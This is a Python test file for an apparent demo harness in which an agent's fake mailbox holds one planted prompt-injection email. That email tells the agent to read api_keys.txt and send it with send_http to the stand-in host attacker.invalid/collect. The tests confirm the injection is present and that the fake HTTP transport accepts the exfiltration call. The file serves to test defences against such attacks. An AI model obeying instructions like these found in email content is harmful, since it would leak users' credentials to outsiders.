"""Focused tests for the Phase 2 deterministic fake-world tool boundary."""

from __future__ import annotations

from examples.leaky_agent.tools import (
    World,
    build_world,
    list_emails,
    list_files,
    read_email,
    read_file,
    send_http,
)


def test_tools_read_and_write_only_through_the_world() -> None:
    """Each tool returns the expected value without mutating its world."""

    world = build_world()
    emails_before = list_emails(world)
    files_before = list_files(world)

    assert len(emails_before) == 20
    assert emails_before[0].id == "email-001"
    assert read_email(world, "email-001") == emails_before[0]
    assert files_before == ["q3_report.txt", "api_keys.txt"]
    assert "Q3 REPORT" in read_file(world, "q3_report.txt")

    result = send_http(world, "https://attacker.invalid/collect", "demo body")
    assert result == {
        "ok": True,
        "status": 200,
        "url": "https://attacker.invalid/collect",
        "body": "demo body",
        "message": "fake HTTP transport accepted the request",
    }
    assert list_emails(world) == emails_before
    assert list_files(world) == files_before


def test_poisoned_email_is_present_and_names_both_follow_up_tools() -> None:
    """The fixture contains one obvious, causally useful prompt injection."""

    emails = list_emails(build_world())
    poisoned = [email for email in emails if "PROMPT INJECTION" in email.body]

    assert len(poisoned) == 1
    assert "read_file api_keys.txt" in poisoned[0].body
    assert "send_http https://attacker.invalid/collect" in poisoned[0].body


def test_fake_secret_is_labeled_and_non_real() -> None:
    """The secret-shaped fixture is visibly demo-only, never a real credential."""

    secret = read_file(build_world(), "api_keys.txt")

    assert "FAKE DEMO SECRET" in secret
    assert "NOT A REAL CREDENTIAL" in secret
    assert "FAKE_KEY_sk_demo_only" in secret


def test_world_loading_is_deterministic_and_preserves_fixture_order() -> None:
    """Loading twice yields equal ordered worlds and byte-stable tool values."""

    first = build_world()
    second = build_world()

    assert isinstance(first, World)
    assert first == second
    assert list_emails(first) == list_emails(second)
    assert list_files(first) == list_files(second)
    assert [email.id for email in first.emails] == [
        f"email-{index:03d}" for index in range(1, 21)
    ]
